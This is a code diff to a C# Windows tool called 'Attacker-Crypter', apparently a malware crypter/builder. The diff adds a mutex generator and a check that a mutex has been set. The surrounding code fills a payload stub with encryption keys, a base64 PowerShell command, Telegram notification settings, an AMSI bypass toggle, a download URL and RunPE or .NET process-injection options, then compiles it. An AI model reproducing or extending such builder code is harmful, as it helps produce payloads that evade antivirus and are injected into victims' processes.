@@ -38,7 +38,12 @@ namespace attackercrypter
 
         }
 
-
+       public  static string GenerateMutexName(string prefix)
+        {
+            int processId = Process.GetCurrentProcess().Id;
+            string uniqueId = Guid.NewGuid().ToString("N");
+            return $"{prefix}_{processId}_{uniqueId}";
+        }
         public static string Encrypt(byte[] plainBytes, string base64Key, string base64IV)
         {
             byte[] key = Convert.FromBase64String(base64Key);
@@ -157,6 +162,10 @@ namespace attackercrypter
                 MessageBox.Show("Please choose your payload architecture x64 or x32");
 
             }
+            else if (string.IsNullOrEmpty(mutex.Text))
+            {
+                MessageBox.Show("Please Generate a Mutex");
+            }
 
 
 
@@ -187,7 +196,7 @@ namespace attackercrypter
                 Params.ReferencedAssemblies.Add(typeof(System.Linq.Enumerable).Assembly.Location);
                 Params.ReferencedAssemblies.Add("System.Drawing.dll");
 
-
+                Source = Source.Replace("$MUTEX", mutex.Text);
 
                 if (Sleeptime.Checked)
                 {
@@ -212,7 +221,8 @@ namespace attackercrypter
 
 
                 }
-                else if (checkBox2.Checked && radioButton2.Checked) {
+                else if (checkBox2.Checked && radioButton2.Checked)
+                {
                     Source = Source.Replace("public static int taskm = 0;", $"public static int taskm = {numericUpDownSc.Value.ToString()};");
                     Source = Source.Replace("public static bool istask = false;", "public static bool istask = true;");
 
@@ -247,13 +257,13 @@ namespace attackercrypter
                             Source = Source.Replace("$chatid", chatid);
                             Source = Source.Replace("public static bool istelegramnotify = false;", "public static bool istelegramnotify = true;");
                         }
-                    
+
 
 
                     }
-                    
-                   
-                    
+
+
+
                 }
                 if (sock.Checked)
                 {
@@ -291,7 +301,7 @@ namespace attackercrypter
                     Source = Source.Replace("public static bool ispwcommand = false;", "public static bool ispwcommand = true;");
                     byte[] bytes = System.Text.Encoding.Unicode.GetBytes(powershellcommand.Text);
                     string encodedCommand = System.Convert.ToBase64String(bytes);
-                    Source = Source.Replace("$command",encodedCommand );
+                    Source = Source.Replace("$command", encodedCommand);
                 }
                 if (Amsi.Enabled == true)
                 {
@@ -300,25 +310,25 @@ namespace attackercrypter
 
                 if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
                 {
-                    MessageBox.Show("Note: This injection only works with .net files", "Attacker-Crypter",MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    MessageBox.Show("Note: This injection only works with .net files", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     Source = Source.Replace("public static bool isdotnetload = false;", "public static bool isdotnetload = true;");
 
                 }
-                else if(Injection.SelectedItem.ToString().ToUpper()== "RUNPE" && runpecheck.Checked == false)
+                else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == false)
                 {
                     MessageBox.Show("Please enable and configure RunPE Settings", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     everytihnggood = 0;
                 }
                 else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == true)
                 {
-         
+
                     if (isNet.Checked == true)
                     {
                         Source = Source.Replace("public static bool isNet = false;", "public static bool isNet = true;");
                         Source = Source.Replace("#DOTNETINJECTPATH", Netinjectionpath.SelectedItem.ToString());
 
                     }
-                    else if(isNative.Checked == true)
+                    else if (isNative.Checked == true)
                     {
                         Source = Source.Replace("public static bool isNative = false;", "public static bool isNative = true;");
 
@@ -391,7 +401,7 @@ namespace attackercrypter
                     Main = Main.Replace("$URL", Convert.ToBase64String(Encoding.UTF8.GetBytes(textBox4.Text)));
                     Main = Main.Replace("$key", textBox2.Text);
                     Main = Main.Replace("$IV", textBox3.Text);
-                    CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Main, Source,RunPE32,RunPE64);
+                    CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Main, Source, RunPE32, RunPE64);
                     if (Results.Errors.Count > 0)
                     {
 
@@ -409,13 +419,13 @@ namespace attackercrypter
                     everytihnggood = 0;
                     return;
                 }
-                
 
 
 
 
 
-                
+
+
 
 
             }
@@ -532,6 +542,16 @@ namespace attackercrypter
         private void pictureIcon_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private void label15_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void mutexgen_Click(object sender, EventArgs e)
+        {
+            mutex.Text = GenerateMutexName("attackercrypter");
         }
     }
 }
